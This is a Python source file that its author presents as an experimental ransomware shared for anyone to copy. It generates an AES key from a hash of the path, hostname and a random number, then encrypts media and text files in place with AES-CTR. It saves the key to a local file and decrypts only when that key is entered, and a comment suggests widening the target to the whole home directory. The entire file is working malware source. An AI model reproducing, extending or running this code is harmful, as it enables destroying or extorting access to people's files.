"""
This software was created by Edinson Requena, Feel free to modify, download or copy it. use it for good <3

Instagram: edinsonrequena
Medium: edinsonrequena
Facebook: Edinson Requena
Twitter: requenaea
Email: requenasoftware@gmail.com

This software just an experiment, if you want to make it global use os.environ['HOME'] Be careful wiht that
"""

import os
import random
import hashlib
import socket

#to use these modules install pycryptodome
from Crypto.Util import Counter
from Crypto.Cipher import AES

username = os.getlogin()

#This only works for me, you must put the path where the ransomware will work on your machine. 
#This is just an experiment, if you want to make it global use os.environ['HOME'] Be careful wiht that
destination = r'C:\Users\{}\desktop\proyectos_libres\ransonwre_dir'.format(username)

destination = os.path.abspath('')
files = os.listdir(destination)
files = [x for x in files if not x.startswith('.')]

#You can add any extensions
extensions = [".txt", ".jpg", '.jpeg', 'mp4', 'mp3', 'png',]

def hash_key():
	hashnumber = destination + socket.gethostname() + str(random.randint(0, 10000000000000000000000000000000000000000000000))
	hashnumber = hashnumber.encode('utf-8')
	print(hashnumber)
	hashnumber = hashlib.sha512(hashnumber)
	hashnumber = hashnumber.hexdigest()

	new_key = []

	for k in hashnumber:
		if len(new_key) == 32:
			hashnumber = ''.join(new_key)
			break
		else:
			new_key.append(k)

	return hashnumber


def encrypt_and_decrypt(text, crypto, block_size = 16):
	with open(text, 'r+b') as encrypted_file:
		unencrypted_content = encrypted_file.read(block_size)
		while unencrypted_content:
			encrypted_content = crypto(unencrypted_content)
			if len(unencrypted_content) != len(encrypted_content):
				raise ValueError('')

			encrypted_file.seek(- len(unencrypted_content), 1)
			encrypted_file.write(encrypted_content)
			unencrypted_content = encrypted_file.read(block_size)



def discover(key):
	files_list = open('files_list', 'w+')

	for extension in extensions:
		for file in files:
			if file.endswith(extension):
				files_list.write(os.path.join(file)+ '\n')
	files_list.close()

	del_space = open('files_list', 'r')
	del_space = del_space.read().split('\n')
	print(del_space)
	del_space = [i for i in del_space if not i == '']
	print(del_space)

	if os.path.exists('hash_file'):
		decrypt_field = input('Enter the symmetric key: ')

		hash_file = open('hash_file', 'r')

		key = hash_file.read().split('\n')
		key = ''.join(key)

		if decrypt_field == key:
			key = key.encode('utf-8')
			counter = Counter.new(128)
			crypto = AES.new(key, AES.MODE_CTR, counter = counter)

			cryp_files = crypto.decrypt

			for element in del_space:
				encrypt_and_decrypt(element, cryp_files)
	else:
		counter = Counter.new(128)
		crypto = AES.new(key, AES.MODE_CTR, counter = counter)

		hash_file = open('hash_file', 'wb')
		hash_file.write(key)
		hash_file.close()

		cryp_files = crypto.encrypt

		for element in del_space:
			encrypt_and_decrypt(element, cryp_files)


def main():
	hashnumber = hash_key()
	print(hashnumber)
	print(len(hashnumber))
	hashnumber = hashnumber.encode('utf-8')
	discover(hashnumber)


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()